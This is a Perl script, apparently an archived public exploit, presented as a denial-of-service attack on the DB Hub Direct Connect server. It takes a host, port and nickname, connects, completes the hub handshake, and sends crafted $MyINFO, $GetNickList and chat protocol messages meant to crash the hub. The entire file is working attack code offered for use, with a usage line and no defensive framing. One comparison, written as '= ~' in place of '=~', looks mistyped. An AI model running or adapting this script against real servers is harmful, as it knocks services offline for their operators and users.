#!/usr/bin/perl
# DB Hub (http://dbhub.ir.pl/) DoS exploit 
# Critical Security (http://www.critical.lt)

use IO::Socket;

my $host = $ARGV[0];
my $port = $ARGV[1];
my $nick = $ARGV[2];

print q( 
----------------------------------------------
|  DB Hub (http://dbhub.ir.pl/) DoS exploit  |
----------------------------------------------
);

if (@ARGV < 3) { 
  print "Usage: perl crit_dbhub.pl host port nick\n";
  exit();
}

if ($connect = IO::Socket::INET->new(PeerAddr => $host, 
                                     PeerPort => $port, 
                                     Proto => tcp,
                                     Timeout => 5 ) 
   or die "[-] Can't connect\n") 
    { 
     print "[+] Connected!\n";
    }

$res = $connect->recv($text,200);
if ($text = ~/Lock/) { $connect->send("\$Key vistiek_netikrina|\$ValidateNick $nick|"); }
$connect->send("\$Version 20|\$MyINFO \$ALL $nick  <++ V:0.674,M:A,H:1/0/0,S:11>\$ \$DSL.\$\$19313847685\$|\$GetNickList|");
$connect->send("<$nick>!|"); # xixi
print "[+] Data sent\n"; 
while($text) { $res = $connect->recv($text,200); }
print "[+] Done\n";
